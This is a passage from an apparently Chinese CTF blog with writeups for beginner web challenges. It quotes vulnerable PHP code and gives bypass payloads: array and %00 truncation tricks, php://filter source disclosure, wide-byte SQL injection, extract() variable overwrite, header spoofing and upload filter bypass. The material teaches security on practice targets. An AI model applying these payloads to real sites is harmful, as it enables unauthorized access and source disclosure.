class="comment">//判断GET传参进来的password是否存在</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)<span class="comment">//从GET传入的password中匹配字母或数字，如果没有匹配到</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">You password must be alphanumeric</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">'password'</span>] &gt; <span class="number">9999999</span>)<span class="comment">//限制password的长度小于8，和值大于9999999</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'-'</span>) !== <span class="keyword">FALSE</span>) <span class="comment">//strpos查找字符串首次出现的位置,要从password中匹配到 - 才行</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">'</span></span><br><span class="line"><span class="string">- have not been found</span></span><br><span class="line"><span class="string">'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Invalid password</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>题目中要求通过ereg（）函数匹配到的password只能是字母或者数字，但是strpos（）要求要匹配到 <code>-</code> 这个符号</p><p>password的长度要小于8而且值要大于9999999</p><ul><li>方法一</li></ul><p>Payload：<code>http://123.206.87.240:9009/5.php?password[]=1</code></p><p>ereg() 只能处理字符串，而password是数组，所以返回的是null，null跟false不一样，所以 null!==false。</p><p>strpos() 的参数同样不能够是数组，所以返回的依旧是null，null!==false也正确。</p><ul><li>方法二</li></ul><p>Payload：<code>http://123.206.87.240:9009/5.php?password=1e9%00-</code></p><p>采用科学技术法绕 针对password的长度小于8，和大于9999999的 </p><p>采用百分号截断来绕过 ereg（）函数…</p><p><br><br><br></p><h2 id="数字验证正则绕过"><a href="#数字验证正则绕过" class="headerlink" title="数字验证正则绕过"></a>数字验证正则绕过</h2><ul><li>两个函数<ul><li>preg_match()返回 pattern 的匹配次数。它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后将会停止搜索。</li><li>preg_match_all()不同于此，它会一直搜索subject 直到到达结尾。如果发生错误preg_match()返回 FALSE。 </li><li>两个函数的区别是preg_match第一次匹配成功后就停止匹配，而preg_match_all是匹配到字符串结束为止</li></ul></li></ul><p>分析代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);<span class="comment">//关闭错误报告</span></span><br><span class="line">$flag = <span class="string">'flag&#123;test&#125;'</span>;<span class="comment">//没什么用的一行</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">"POST"</span> == $_SERVER[<span class="string">'REQUEST_METHOD'</span>])<span class="comment">//判断提交的数据是否是POST方式传来的</span></span><br><span class="line">&#123;</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];<span class="comment">//POST传参赋值</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> &gt;= preg_match(<span class="string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, $password)) <span class="comment">//在password中进行正则匹配，除空格符(空格键与[TAB]键)之外的所有按键</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'flag'</span>;<span class="comment">//输出flag</span></span><br><span class="line"><span class="keyword">exit</span>;<span class="comment">//退出</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">TRUE</span>)<span class="comment">//当是对的</span></span><br><span class="line">&#123;</span><br><span class="line">$reg = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;<span class="comment">//正则匹配，对$reg进行赋值</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">6</span> &gt; preg_match_all($reg, $password, $arr))<span class="comment">//如果在$reg, $password, $arr中匹配到的数大于6</span></span><br><span class="line"><span class="keyword">break</span>;<span class="comment">//结束</span></span><br><span class="line">$c = <span class="number">0</span>;<span class="comment">//对c赋值等于0</span></span><br><span class="line">$ps = <span class="keyword">array</span>(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>); <span class="comment">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span></span><br><span class="line"><span class="keyword">foreach</span> ($ps <span class="keyword">as</span> $pt)<span class="comment">//遍历打印数组</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/[[:$pt:]]+/"</span>, $password))<span class="comment">//进行匹配</span></span><br><span class="line">$c += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($c &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">//&gt;=3，必须包含四种类型三种与三种以上</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">"42"</span> == $password) <span class="keyword">echo</span> $flag;<span class="comment">//如果42等于$password,输出flag，注意是双等号~</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">'Wrong password'</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很奇怪的是hackbar直接post提交任何参数都能直接弹出flag…</p><p>其次就是 preg_match()函数 不能处理数组，所以想到数组绕过…</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>南邮CTF Web Writeup</title>
      <link href="/2019/03/05/%E5%8D%97%E9%82%AECTF-Web-WP/"/>
      <url>/2019/03/05/%E5%8D%97%E9%82%AECTF-Web-WP/</url>
      
        <content type="html"><![CDATA[<p>南邮CTF的Web题…</p><a id="more"></a><p><img src="/.com//2.png" alt></p><h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><ul><li><p>F12查看页面源码</p></li><li><p>然后就可以看见flag…</p></li></ul><p><br><br><br></p><h1 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h1><p><strong>分析代码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$md51 = md5(<span class="string">'QNKCDZO'</span>);<span class="comment">//将QNKCFZO经过md5加密，赋值给md51</span></span><br><span class="line">$a = @$_GET[<span class="string">'a'</span>];<span class="comment">//GET传参</span></span><br><span class="line">$md52 = @md5($a);<span class="comment">//经过md5加密的变量a赋值给md52</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;<span class="comment">//判断是否设置变量a</span></span><br><span class="line"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;<span class="comment">//内层if语句判断变量a不等于QNKCDZO，且md51和md52相等</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"nctf&#123;*****************&#125;"</span>;<span class="comment">//输出flag</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"false!!!"</span>;<span class="comment">//否则输出"false"</span></span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"please input a"</span>;&#125;<span class="comment">//最外层if条件判断</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>php的弱类型比较，当两个值使用==进行比较时，只是比较变量的值，而不会去比较变量的类型…</li></ul><p><br><br><br></p><h1 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h1><ul><li><p>F12改maxlength属性</p></li><li><p>输入口令得到flag…</p></li></ul><p><br><br><br></p><h1 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a>这题不是WEB</h1><ul><li><p>不是Web…下载图片</p></li><li><p>暴力txt文档打开（或者使用winhex）</p></li><li><p>文档末端有flag…</p></li></ul><p><br><br><br></p><h1 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h1><ul><li><p>查看页面源代码（右键点击就ok了）</p></li><li><p>一直点链接，<code>&lt;iframe src=&quot;&quot;&gt;</code>,src属性里面的链接一直点。最后出现注释掉的文字</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Placed at the end of the document so the pages load faster --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--  </span></span><br><span class="line"><span class="comment">&lt;script src="./js/jquery-n.7.2.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="./js/jquery-c.7.2.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="./js/jquery-t.7.2.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="./js/jquery-f.7.2.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="./js/jquery-&#123;.7.2.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="./js/jquery-t.7.2.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="./js/jquery-h.7.2.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="./js/jquery-i.7.2.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="./js/jquery-s.7.2.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="./js/jquery-_.7.2.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="./js/jquery-i.7.2.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="./js/jquery-s.7.2.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="./js/jquery-_.7.2.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="./js/jquery-a.7.2.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="./js/jquery-_.7.2.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="./js/jquery-f.7.2.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="./js/jquery-l.7.2.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="./js/jquery-4.7.2.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="./js/jquery-g.7.2.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="./js/jquery-&#125;.7.2.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><ul><li>每行在<code>./js/jquery-</code>之后的一个字符连接起来就是flag…</li></ul><p><br><br><br></p><h1 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h1><ul><li><p>什么是jjencode?</p><ul><li>将JS代码转换成只有符号的字符串</li></ul></li><li><p>什么是aaencode？</p><ul><li>将JS代码转换成常用的网络表情。</li></ul></li></ul><br>- 浏览器 Unicode 解码<ul><li><p>直接甩进控制台，报错<code>ReferenceError: ωﾟﾉ is not defined</code></p></li><li><p>继续定义 <code>ωﾟﾉ = &#39;&#39;</code>定义它为空</p></li><li><p>再次甩进控制台，弹窗得flag…</p></li></ul><p><br><br><br></p><h1 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h1><ul><li><p>根据题目信息提示，开启 Burp Suite ，在url跳转处抓包。</p></li><li><p>甩进 Burp Suite 中的Repeater模块。</p></li><li><p>Go一下，得flag…</p></li></ul><p><br><br><br></p><h1 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h1><ul><li><p>根据题目信息提示，开启 Burp Suite，直接抓包</p></li><li><p>改referer为 <code>https://www.google.com</code> 得flag…（但是这题我做的时候那边环境貌似挂掉了）</p></li><li><p>假装得flag…</p></li></ul><p><br><br><br></p><h1 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h1><p><strong>分析代码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CLsI</span><span class="params">($ZzvSWE)</span> </span>&#123;<span class="comment">//自定义函数</span></span><br><span class="line"></span><br><span class="line">    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));<span class="comment">//加密</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($ZzvSWE); $i++) &#123;<span class="comment">//循环</span></span><br><span class="line"></span><br><span class="line">        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - <span class="number">1</span>);<span class="comment">//ord()函数主要用来返回对应字符的ascii码，chr()主要用来表示ascii码对应的字符</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $ZzvSWE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//上面的函数就是一个加密过程，其实没太大用...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//题目中说到php跟shell。这里的eval跟php对不上</span></span><br><span class="line"><span class="keyword">eval</span>(CLsI(<span class="string">"+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>将最后一排的 <code>eval</code> 换成<code>echo</code> 找个在线解码的网站，得flag…</li></ul><p><br><br><br></p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><ul><li><strong>补充知识：</strong><ul><li><a href="https://www.freebuf.com/column/148886.html" target="_blank" rel="noopener">php伪协议实现命令执行的七种姿势 </a></li><li><a href="https://www.freebuf.com/column/183226.html" target="_blank" rel="noopener">ctf中关于php伪协议的考查 </a></li></ul></li></ul><ul><li><p>在 URL 跳转后，URL末端多了一个 <code>?file=show.php</code> ,这里的<code>file</code>是可控的,此题利用php的伪协议</p></li><li><p>在URL末端构造 <code>?file=php://filter/read=convert.base64-encode/resource=index.php</code>,弹回base64位加密后的文件</p><ul><li>php://filter/可用于处理打开的数据流，起到过滤作用。如果源文件为.php则很有可能在前台显示不出来。</li><li>所以让文件转化为base64格式（convert.base64-encode）然后再输出，这样不论是什么格式的文件都可以在前台输出。</li></ul></li></ul><ul><li>base64解密，得flag…</li></ul><p><br><br><br></p><h1 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h1><ul><li>通上题《单身二十年》</li></ul><p><br><br><br></p><h1 id="COOKIE"><a href="#COOKIE" class="headerlink" title="COOKIE"></a>COOKIE</h1><ul><li><p>根据tips： 0==not ;那么进去直接F12，修改cookie值为1.</p></li><li><p>刷新页面得flag…</p></li></ul><p><br><br><br></p><h1 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h1><ul><li><p>根据提示在 URL 后加上 <code>robots.txt</code>,看见一堆代码</p></li><li><p>分析源码</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[id]) &#123;<span class="comment">//get传参</span></span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $id = intval($_GET[id]);<span class="comment">//获取GET传来的变量的整数值，赋值给id变量</span></span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select content from ctf2 where id='$id'"</span>));<span class="comment">//查询语句</span></span><br><span class="line">  <span class="keyword">if</span> ($_GET[id]==<span class="number">1024</span>) &#123;<span class="comment">//判断GET传参传进来的是否是1024</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;<span class="comment">//输出</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>($query[content]);<span class="comment">//输出</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>代码逻辑通透，先访问题目中给出的 sql.php 然后传入一个float型的1024.0001，转成1024进入函数判断。得falg…</li></ul><p><br><br><br></p><h1 id="sql-injection-3"><a href="#sql-injection-3" class="headerlink" title="sql injection 3"></a>sql injection 3</h1><ul><li><p>进来看见一个查询语句 <code>your sql:select id,title from news where id = &#39;1&#39;</code> URL为 <code>?id=1</code></p></li><li><p>输入的<code>&#39;</code> 全都被转义，应该是考察宽字节注入 <code>%df&#39;</code> 完美绕过</p></li><li><p>经过漫长的注入，得到flag…</p></li></ul><p><br><br><br></p><h1 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h1><ul><li>分析源码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">view-source:</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'nctf'</span>])) &#123;<span class="comment">//判断</span></span><br><span class="line">       <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'nctf'</span>]) === <span class="keyword">FALSE</span>)<span class="comment">//匹配字符，正则：1-9的数字出现1到多次</span></span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)  <span class="comment">//要出现 #biubiubiu 这串字符，才给flag</span></span><br><span class="line">           <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ul><li><p>if和 else if 中需要一个纯数字，但是还要出现<code>#biubiubiu</code>这个字符的</p></li><li><p><strong>多种解法：</strong></p><ul><li>方法一：<code>%00</code>截断 输入<code>nctf=1%00%23biubiubiu</code>,得flag…</li><li>方法二：数组绕过，输入 <code>nctf[]=1</code> 即可绕过，第一个if是为空，绕过 FALSE（false与null还是有区别），第二个if，strpos（）处理不了数组,得flag…</li></ul></li></ul><p><br><br><br></p><h1 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h1><ul><li><p>tips是：弱类型。</p></li><li><p>分析源码：</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'b'</span>])) &#123;<span class="comment">//判断是否设置变量</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'a'</span>] != $_GET[<span class="string">'b'</span>])<span class="comment">//GET传入的a、b不能相等</span></span><br><span class="line"><span class="keyword">if</span> (md5($_GET[<span class="string">'a'</span>]) == md5($_GET[<span class="string">'b'</span>]))<span class="comment">//md5加密过的a,b要一样</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);<span class="comment">//flag</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Wrong.'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>md5处理不了数组，传入<code>a[]=1&amp;&amp;b[]=2</code>，得到flag…</li></ul><p><br><br><br></p><h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><ul><li><p>网页打开是一个搜索框，点击下面的 source.php 选项，查看源码</p></li><li><p>分析源码</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] == <span class="string">"POST"</span>) <span class="comment">//判断是否为POST传参</span></span><br><span class="line">&#123;</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span> ($pass == $thepassword_123)<span class="comment">//判断是否相等</span></span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">echo</span> $theflag;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>extract()</code>函数的作用：<strong>从数组中</strong>将变量导入到当前的符号表，可以看到这里的代码为：<code>extract($_POST)</code>，即将POST的参数导入当前的符号表<ul><li>方法一：<code>pass=1&amp;thepassword_123=1</code></li><li>方法二：<code>pass[]=&amp;thepassword_123</code></li></ul></li></ul><ul><li>得flag…</li></ul><p><br><br><br></p><h1 id="PHP是世界上最好的语言"><a href="#PHP是世界上最好的语言" class="headerlink" title="PHP是世界上最好的语言"></a>PHP是世界上最好的语言</h1><ul><li>分析源码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;<span class="comment">//eregi()函数在一个字符串搜索指定的模式的字符串</span></span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);<span class="comment">//编码GET传入的id值后赋值给id</span></span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>因为浏览器会进行一次编码，所以这里二次编码即可。得flag…</li></ul><p><br><br><br></p><h1 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h1><ul><li><strong>补充知识：</strong><ul><li><code>$_SERVER[“HTTP_X_FORWARDED_FOR”]</code> 获得的值是HTTP中 X-Forwarded-For</li><li><code>$_SERVER[“HTTP_CLIENT_IP”]</code> 获得的值是HTTP中 Client-Ip( client-ip书写测试结果：服务器为window环境，则client-ip可以大小写混写。服务器环境为linux，则client-ip必须全部大写)</li><li><code>$_SERVER[“REMOTE_ADDR”]</code> 获得的值为 最后一个跟你的服务器握手的IP，可能会是代理IP或者其他</li><li><code>$_SERVER[“HTTP_REFERER”]</code> 获得的值为 HTTP中的Referer</li></ul></li></ul><ul><li><p>Burp suite 抓包，添加：<code>X-Forward-for:127.0.0.1</code></p></li><li><p>得到flag…</p></li></ul><p><br><br><br></p><h1 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h1><ul><li><a href="http://www.cnblogs.com/ranyonsue/p/5984001.html" target="_blank" rel="noopener">关于HTTP协议，一篇就够了</a></li></ul><ul><li>返回的响应头中有flag…</li></ul><p><br><br><br></p><h1 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h1><ul><li><p>补充知识：</p><ul><li><a href="http://www.cnblogs.com/shellr00t/p/6426945.html" target="_blank" rel="noopener">典型漏洞归纳之上传漏洞</a></li><li><a href="https://www.freebuf.com/column/161357.html" target="_blank" rel="noopener">Web安全 — 上传漏洞绕过 </a></li></ul></li><li><p>上传文件的过程中：</p><ul><li>上传图片文件 ——》代码提示：必须上传后缀为php的文件</li><li>上传php文件 ——》代码提示：不被允许的文件类型,仅支持上传jpg,gif,png后缀的文件</li></ul></li><li><p>Burp suite 抓包，在路径 <code>/upload</code>后面加上空格，再加<code>1.php</code>(表示自己上传php文件)。再改相应的对应的16进制编码，然后将空格%20修改为00</p></li><li><p>提交，得到flag…</p></li></ul><p><br><br><br></p><h1 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h1><ul><li>分析源码：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span 